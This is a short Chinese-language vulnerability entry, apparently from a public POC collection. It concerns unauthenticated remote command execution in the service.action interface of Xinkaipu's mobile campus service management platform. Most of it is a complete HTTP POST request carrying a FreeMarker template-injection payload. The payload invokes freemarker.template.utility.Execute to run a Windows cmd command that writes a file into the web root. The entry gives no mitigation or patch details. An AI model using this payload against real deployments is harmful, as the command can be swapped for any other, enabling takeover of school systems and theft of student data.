
## 新开普掌上校园服务管理平台service.action远程命令执行
新开普掌上校园服务管理平台service.action接口处存在远程命令执行漏洞，攻击者可在未经身份认证的情况下，调用后台接口，执行恶意系统命令。

## POC
```
POST /service_transport/service.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Length: 211
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1

{  "command": "GetFZinfo",  "UnitCode": "<#assign ex = "freemarker.template.utility.Execute"  ?new()>${ex("cmd /c echo 123 >./webapps/ROOT/test.txt")}"}

```

![image](https://github.com/wy876/POC/assets/139549762/1743d6a9-3472-4e9e-ad0e-86b1d5a50dac)
![image](https://github.com/wy876/POC/assets/139549762/67e35c0c-6892-409c-9239-425b79566650)

